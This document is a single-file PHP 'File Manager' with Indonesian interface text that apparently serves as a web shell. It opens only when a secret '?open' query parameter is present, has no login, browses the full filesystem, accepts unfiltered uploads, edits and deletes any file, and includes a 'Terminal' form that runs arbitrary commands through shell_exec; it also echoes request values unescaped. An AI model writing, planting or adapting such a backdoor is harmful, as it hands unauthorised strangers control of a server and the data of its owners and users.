xx
<?php
/****************************
 * Modern PHP File Manager (Require ?open)
 ****************************/

// === Require query ?open ===
if (!isset($_GET['open'])) {
    http_response_code(403);
    exit("Access blocked");
}

$BASE_START = __DIR__;

function safe_real($p){
    $r = realpath($p);
    return $r !== false ? $r : null;
}

$cwd = isset($_GET['p']) ? $_GET['p'] : $BASE_START;
$cwd = safe_real($cwd) ?: $BASE_START;

$msg = "";

// ===== Permission Helpers =====
function perms_string($path){
    $p = fileperms($path);

    $info = ($p & 0x4000) ? 'd' : '-';
    $info .= ($p & 0x0100) ? 'r' : '-';
    $info .= ($p & 0x0080) ? 'w' : '-';
    $info .= ($p & 0x0040) ? 'x' : '-';
    $info .= ($p & 0x0020) ? 'r' : '-';
    $info .= ($p & 0x0010) ? 'w' : '-';
    $info .= ($p & 0x0008) ? 'x' : '-';
    $info .= ($p & 0x0004) ? 'r' : '-';
    $info .= ($p & 0x0002) ? 'w' : '-';
    $info .= ($p & 0x0001) ? 'x' : '-';

    return $info;
}

function writable_status($path){
    return is_writable($path) ? "✔ Writable" : "✖ Read-Only";
}

// ===== Actions =====
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
    $a = $_POST['action'];

    // Upload (tanpa filter — bisa ditambahkan jika perlu)
    if ($a==='upload' && isset($_FILES['file'])) {
        move_uploaded_file($_FILES['file']['tmp_name'], $cwd.'/'.basename($_FILES['file']['name']));
        $msg="Upload sukses";
    }

    if ($a==='mkdir' && !empty($_POST['folder'])) {
        @mkdir($cwd.'/'.basename($_POST['folder']));
        $msg="Folder dibuat";
    }

    if ($a==='mkfile' && !empty($_POST['filename'])) {
        $f=$cwd.'/'.basename($_POST['filename']);
        if(!file_exists($f)) file_put_contents($f,"");
        $msg="File dibuat";
    }

    if ($a==='rename') {
        $old=safe_real($cwd.'/'.$_POST['old']);
        $new=$cwd.'/'.basename($_POST['new']);
        if($old) @rename($old,$new);
        $msg="Rename berhasil";
    }

    if ($a==='delete') {
        $t=safe_real($cwd.'/'.$_POST['target']);
        if($t){ is_dir($t)?@rmdir($t):@unlink($t); }
        $msg="Terhapus";
    }

    if ($a==='save') {
        $f=safe_real($cwd.'/'.$_POST['file']);
        if($f && is_file($f)) file_put_contents($f,$_POST['content']);
        $msg="Disimpan";
    }

    // ===== TERMINAL =====
    if ($a==='terminal') {
        $cmd = $_POST['cmd'] ?? '';
        if ($cmd !== '') {
            $terminal_output = shell_exec("cd ".escapeshellarg($cwd)." && ".$cmd." 2>&1");
        }
    }

    if ($a!=='terminal') {
        header("Location: ?open&p=".urlencode($cwd)."&msg=".urlencode($msg));
        exit;
    }
}

$editFile=null;
if(isset($_GET['edit'])){
    $ep=safe_real($cwd.'/'.$_GET['edit']);
    if($ep && is_file($ep)) $editFile=$ep;
}

$items=scandir($cwd);

function breadcrumb($path){
    $parts=explode('/',trim($path,'/'));
    $acc=''; $links=[];
    foreach($parts as $p){
        if($p==='') continue;
        $acc.='/'.$p;
        $links[]=['name'=>$p,'path'=>$acc];
    }
    return $links;
}
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>File Manager</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css">

<style>
/* ===== LIGHT / WHITE THEME ===== */
body{
  background:#ffffff;
  color:#222;
  font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

.card-modern{
  border-radius:12px;
  background:#ffffff;
  border:1px solid #dcdcdc;
  box-shadow:0 4px 10px rgba(0,0,0,.06);
}

.table thead{
  background:#f2f4f7;
  color:#333;
}

.table tbody tr:hover{
  background:#f8fafc;
}

.badge-folder{
  background:#e8f1ff;
  color:#1a4fb8;
  border-radius:6px;
  padding:4px 8px;
}

.badge-file{
  background:#eef0f3;
  color:#555;
  border-radius:6px;
  padding:4px 8px;
}

input,textarea{
  background:#ffffff!important;
  color:#222!important;
  border:1px solid #c9c9c9!important;
  border-radius:6px;
}

a{color:#0d6efd;text-decoration:none;}
a:hover{text-decoration:underline;}

.btn-dark{background:#333!important;border-color:#333!important;}
.btn-xs{padding:2px 6px;font-size:.75rem;border-radius:4px;}
textarea{font-family:'Courier New',monospace;}
</style>
</head>

<body>
<div class="container-fluid px-3 py-3">

  <h2 class="fw-bold mb-2"><i class="bi bi-folder-fill me-2"></i>File Manager</h2>
  <p class="text-muted small mb-3">Light • Minimal • Clean</p>

  <?php if(isset($_GET['msg'])): ?>
  <div class="alert alert-success card-modern mb-3">
    <i class="bi bi-check-circle-fill me-2"></i><?=$_GET['msg']?>
  </div>
  <?php endif; ?>

  <!-- ===== Breadcrumb + Actions ===== -->
  <div class="card card-modern mb-4">
    <div class="card-body p-3">

      <strong class="small text-secondary">Path:</strong>
      <nav aria-label="breadcrumb" class="d-inline">
        <ol class="breadcrumb p-0 m-0">
          <li class="breadcrumb-item"><a href="?open&p=/"><i class="bi bi-house-door"></i></a></li>
          <?php foreach(breadcrumb($cwd) as $b): ?>
            <li class="breadcrumb-item"><a href="?open&p=<?=urlencode($b['path'])?>"><?=$b['name']?></a></li>
          <?php endforeach; ?>
        </ol>
      </nav>

      <div class="d-flex flex-wrap gap-2 justify-content-end mt-2">

        <form method="post" enctype="multipart/form-data" class="d-flex gap-2">
          <input type="hidden" name="action" value="upload">
          <input type="file" name="file" class="form-control form-control-sm" required>
          <button class="btn btn-primary btn-sm"><i class="bi bi-upload me-1"></i>Upload</button>
        </form>

        <form method="post" class="d-flex gap-2">
          <input type="hidden" name="action" value="mkdir">
          <input type="text" name="folder" placeholder="New folder" class="form-control form-control-sm">
          <button class="btn btn-success btn-sm"><i class="bi bi-folder-plus me-1"></i>Create</button>
        </form>

        <form method="post" class="d-flex gap-2">
          <input type="hidden" name="action" value="mkfile">
          <input type="text" name="filename" placeholder="New file" class="form-control form-control-sm">
          <button class="btn btn-info btn-sm"><i class="bi bi-file-earmark-plus me-1"></i>Create</button>
        </form>

      </div>
    </div>
  </div>

  <!-- ===== TERMINAL ===== -->
  <div class="card card-modern mb-4">
    <div class="card-header bg-white fw-semibold">
      <i class="bi bi-terminal me-2"></i>Terminal
    </div>
    <div class="card-body">
      <form method="post" class="d-flex gap-2">
        <input type="hidden" name="action" value="terminal">
        <input type="text" name="cmd" class="form-control" placeholder="masukkan perintah (mis: ls -la)">
        <button class="btn btn-dark"><i class="bi bi-play"></i></button>
      </form>

      <?php if(!empty($terminal_output)): ?>
        <textarea class="form-control mt-2" rows="6" readonly><?=htmlspecialchars($terminal_output)?></textarea>
      <?php endif; ?>
    </div>
  </div>

  <?php if($editFile): ?>
  <div class="card card-modern mb-4">
    <div class="card-header bg-white fw-semibold">
      <i class="bi bi-pencil-square me-2"></i>Edit — <?=basename($editFile)?>
    </div>
    <div class="card-body">
      <form method="post">
        <input type="hidden" name="action" value="save">
        <input type="hidden" name="file" value="<?=htmlspecialchars($_GET['edit'])?>">
        <textarea rows="15" name="content" class="form-control mb-3"><?=htmlspecialchars(file_get_contents($editFile))?></textarea>
        <button class="btn btn-primary"><i class="bi bi-save me-1"></i>Simpan</button>
        <a href="?open&p=<?=urlencode($cwd)?>" class="btn btn-dark ms-2">Batal</a>
      </form>
    </div>
  </div>
  <?php endif; ?>

  <!-- ===== FILE LIST ===== -->
  <div class="card card-modern">
    <div class="table-responsive">
      <table class="table table-hover mb-0">
        <thead>
        <tr>
          <th class="ps-3">Nama</th>
          <th>Tipe</th>
          <th>Ukuran</th>
          <th>Permission</th>
          <th>Status</th>
          <th class="text-end pe-3">Aksi</th>
        </tr>
        </thead>
        <tbody>

        <?php foreach($items as $it):
          if($it==='.') continue;
          $full=safe_real($cwd.'/'.$it);
          if(!$full) continue;
          $isDir=is_dir($full);
        ?>
        <tr>
          <td class="ps-3">
            <?php if($isDir): ?>
              <span class="badge badge-folder me-2"><i class="bi bi-folder"></i></span>
              <a href="?open&p=<?=urlencode($full)?>"><?=$it?></a>
            <?php else: ?>
              <span class="badge badge-file me-2"><i class="bi bi-file-earmark"></i></span>
              <?=$it?>
            <?php endif; ?>
          </td>

          <td><?=$isDir?'Folder':'File'?></td>
          <td><?=$isDir?'—':number_format(filesize($full)).' bytes'?></td>

          <td><?=perms_string($full)?></td>
          <td><?=writable_status($full)?></td>

          <td class="text-end pe-3">
            <div class="d-flex gap-1 justify-content-end flex-wrap">
              <?php if(!$isDir): ?>
                <a class="btn btn-primary btn-xs" href="?open&p=<?=urlencode($cwd)?>&edit=<?=urlencode($it)?>">
                  <i class="bi bi-pencil"></i> Edit
                </a>
              <?php endif; ?>

              <form method="post" onsubmit="return confirm('Hapus item ini?')">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="target" value="<?=htmlspecialchars($it)?>">
                <button class="btn btn-danger btn-xs"><i class="bi bi-trash"></i> Delete</button>
              </form>

              <form method="post" class="d-flex gap-1">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="old" value="<?=htmlspecialchars($it)?>">
                <input type="text" name="new" class="form-control form-control-sm" placeholder="rename" style="width:100px;">
                <button class="btn btn-dark btn-xs"><i class="bi bi-check"></i></button>
              </form>
            </div>
          </td>
        </tr>
        <?php endforeach;?>

        </tbody>
      </table>
    </div>
  </div>

</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
